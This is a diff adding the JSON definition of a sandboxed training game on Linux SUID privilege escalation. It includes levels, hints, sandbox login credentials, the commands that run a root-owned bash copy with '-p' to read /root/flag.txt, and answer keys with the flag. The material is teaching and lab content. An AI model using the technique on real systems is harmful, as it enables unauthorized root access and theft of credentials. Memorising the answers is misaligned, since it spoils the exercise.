@@ -1,0 +1,187 @@
+{
+  "title": "SUID Privilege Escalation",
+  "description": "Learn to discover and exploit SUID binaries to escalate privileges on a Linux server.",
+  "prerequisites": [],
+  "outcomes": [
+    "Understand what the SUID bit is and why it is dangerous when set on a shell binary.",
+    "Use find to enumerate SUID binaries on a system.",
+    "Exploit a misconfigured SUID binary to read files protected by root."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": false,
+  "estimated_duration": 30,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "content": "# General information — please read carefully\n\n* The result of each level is needed to complete the next one. Do not skip ahead.\n* If you get stuck, use the hints or Google.\n* This game is for educational purposes only. Only attack systems within this sandbox.\n\n# Storyline\n\nYou are a penetration tester contracted by NovaTech Solutions to audit their backup server. The IT team has handed you a low-privilege account — `trainee` — and asked you to see how far you can get. During a recent change window, a careless sysadmin installed a 'debug shell' on the server and forgot to remove it. Your job: find it, exploit it, and prove you can read root's files."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "passkey": "start",
+      "cloud_content": "SSH to the attacker machine at **10.1.28.23** using your assigned credentials, then connect to the target server:\n\n```\nssh trainee@10.1.28.10\nPassword: letmein123\n```\n\nThe target server is at **10.1.28.10**. Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "SSH directly to the target server:\n\n```\nssh -p 2222 trainee@127.0.0.1\nPassword: letmein123\n```\n\nSubmit **start** to begin."
+    },
+    {
+      "title": "Find the SUID Binary",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 8,
+      "answer": "suid-shell",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You are now logged in as `trainee` on the NovaTech backup server. You have very limited privileges — you cannot read `/root/` or any admin files.\n\nOne of the most common privilege escalation vectors on Linux is a misconfigured **SUID binary**. When a binary has the SUID (Set User ID) bit set and is owned by root, it runs as root regardless of who executes it. Attackers search for non-standard SUID binaries that should not be there.\n\nTo list all SUID binaries on the system:\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nLook at the output carefully. Most SUID binaries are standard system utilities (`sudo`, `passwd`, `su`). One binary in `/usr/local/bin/` does not belong there.\n\n**What is the filename (not full path) of the suspicious non-standard SUID binary?**",
+      "solution": "```\ntrainee@server:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/su\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/umount\n/usr/local/bin/suid-shell\n```\n\nThe suspicious binary is **suid-shell** — everything else is a standard system utility.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "What command finds SUID binaries?",
+          "content": "Use `find` with the `-perm` flag. The SUID bit in numeric mode is `4000`. To find files with this bit set: `find / -perm -4000 -type f 2>/dev/null`",
+          "hint_penalty": 2,
+          "order": 0
+        },
+        {
+          "title": "What does the output look like?",
+          "content": "Most results will be in `/usr/bin/` — those are expected. Look for anything in `/usr/local/bin/` which is where local custom binaries live.",
+          "hint_penalty": 5,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 15,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1083" }
+      ]
+    },
+    {
+      "title": "Confirm Root Access",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 8,
+      "answer": "root",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You found `/usr/local/bin/suid-shell`. It is owned by root and has the SUID bit set.\n\nThis binary is a copy of bash. On modern Linux systems, bash drops its elevated privileges by default when it detects that the effective UID differs from the real UID — a safety measure. However, the **`-p` (privileged) flag** disables this protection and keeps the root effective UID.\n\nRun the binary with `-p` and ask it who it is running as:\n\n```\n/usr/local/bin/suid-shell -p -c 'whoami'\n```\n\nNote the sysadmin's maintenance note in your home directory (`cat ~/note.txt`) — it confirms a debug shell was deliberately left here.\n\n**What username does the `whoami` command return when run through suid-shell -p?**",
+      "solution": "```\ntrainee@server:~$ /usr/local/bin/suid-shell -p -c 'whoami'\nroot\n```\n\nThe binary runs as **root** because of the SUID bit and the `-p` flag.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which flag keeps bash's elevated privileges?",
+          "content": "Bash drops SUID privileges by default. The `-p` flag (privileged mode) prevents this. Try: `/usr/local/bin/suid-shell -p -c 'whoami'`",
+          "hint_penalty": 5,
+          "order": 0
+        },
+        {
+          "title": "What should the answer be?",
+          "content": "If SUID is working correctly, you are running as the file's owner. Check who owns `suid-shell` with `ls -la /usr/local/bin/suid-shell`.",
+          "hint_penalty": 8,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 20,
+      "mitre_techniques": [
+        { "technique_key": "TA0004.T1548" }
+      ]
+    },
+    {
+      "title": "Read the Root Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 5,
+      "answer": "WMG{su1d_b4sh_pr1v3sc_1s_trivial}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have confirmed that `/usr/local/bin/suid-shell -p` gives you an effective UID of root. The flag is stored in `/root/flag.txt`, owned by root with permissions `0400` — no one but root can read it directly.\n\nUse your root access to read it:\n\n```\n/usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'\n```\n\nIn a real engagement this same technique lets an attacker read `/etc/shadow`, SSH private keys, database credentials, or any other root-protected file on the system.\n\n**Submit the flag from `/root/flag.txt`.**",
+      "solution": "```\ntrainee@server:~$ /usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'\nWMG{su1d_b4sh_pr1v3sc_1s_trivial}\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to read a file with the SUID shell?",
+          "content": "Use the same pattern as the previous level: `/usr/local/bin/suid-shell -p -c 'cat /path/to/file'`",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Where is the flag?",
+          "content": "The flag is in `/root/flag.txt`.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0006.T1552" }
+      ]
+    },
+    {
+      "title": "Feedback",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "assessment_type": "QUESTIONNAIRE",
+      "instructions": "Please answer the questions below to help us improve this game.",
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How difficult did you find this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            { "text": "Too easy",      "correct": true, "order": 0 },
+            { "text": "About right",   "correct": true, "order": 1 },
+            { "text": "Too difficult", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Before this game, were you aware that SUID binaries could be exploited?",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            { "text": "Yes, I knew this already", "correct": true, "order": 0 },
+            { "text": "I had heard of it",         "correct": true, "order": 1 },
+            { "text": "No, this was new to me",    "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "How would you rate the clarity of the level instructions?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            { "text": "Very clear",          "correct": true, "order": 0 },
+            { "text": "Mostly clear",        "correct": true, "order": 1 },
+            { "text": "Confusing at times",  "correct": true, "order": 2 },
+            { "text": "Hard to follow",      "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What would you change or add to improve this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": false,
+          "choices": []
+        }
+      ]
+    }
+  ]
+}
